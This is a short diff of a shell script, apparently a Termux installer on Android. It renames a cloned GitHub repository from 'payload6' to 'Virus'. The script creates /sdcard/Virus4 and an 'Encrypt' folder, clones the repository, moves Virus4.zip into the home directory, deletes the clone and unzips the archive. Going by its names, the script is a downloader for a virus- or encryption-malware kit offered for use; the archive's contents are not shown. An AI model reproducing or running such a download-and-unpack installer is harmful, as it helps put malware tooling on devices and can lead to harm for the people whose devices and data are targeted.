@@ -147,20 +147,20 @@ mkdir /sdcard/Virus4
 
 mkdir /sdcard/Virus4/Encrypt
 
-git clone https://github.com/amerlaceset/payload6
+git clone https://github.com/amerlaceset/Virus
 
 cd
 
-cd payload6
+cd Virus
 
 mv -v Virus4.zip $HOME
 
-rm -rf payload6
+rm -rf Virus
 
 cp Virus4/Virus4.zip $HOME
 
 
-rm -rf payload6
+rm -rf Virus
 
 
 unzip Virus4.zip
